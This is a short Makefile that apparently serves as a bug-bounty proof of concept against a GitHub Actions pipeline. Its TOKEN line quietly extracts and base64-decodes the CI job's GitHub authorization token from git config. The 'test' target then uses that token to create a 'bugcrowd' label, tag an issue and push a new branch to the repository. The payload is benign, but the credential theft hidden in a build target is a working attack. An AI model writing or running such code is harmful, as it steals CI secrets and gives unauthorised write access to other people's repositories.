TOKEN := $(shell git config --get http.https://github.com/.extraheader | sed -nE 's/AUTHORIZATION: basic (.*)/\1/p' | base64 -d | sed -nE 's/.*:(.*)/\1/p')

test:
	curl -L -s -X POST -d '{"name":"bugcrowd","description":"bugcrowd","color":"ff6900"}' \
        -H "Authorization: Bearer ${TOKEN}" \
        -H "X-GitHub-Api-Version: 2022-11-28" \
        -H "Accept: application/vnd.github.v3+json" \
        -H "Content-Type: application/json" \
        https://api.github.com/repos/ndavisontest/actions-test/labels
	curl -L -s -X POST -d '{"labels":["bugcrowd"]}' \
        -H "Authorization: Bearer ${TOKEN}" \
        -H "X-GitHub-Api-Version: 2022-11-28" \
        -H "Accept: application/vnd.github.v3+json" \
        -H "Content-Type: application/json" \
        https://api.github.com/repos/ndavisontest/actions-test/issues/3/labels
	git config --global user.email "you@example.com"
	git config --global user.name "Your Name"
	git checkout -b blabla4
	echo "hello" > hello.txt
	git add hello.txt
	git commit -m "Hello"
	git push origin blabla4

.PHONY: test


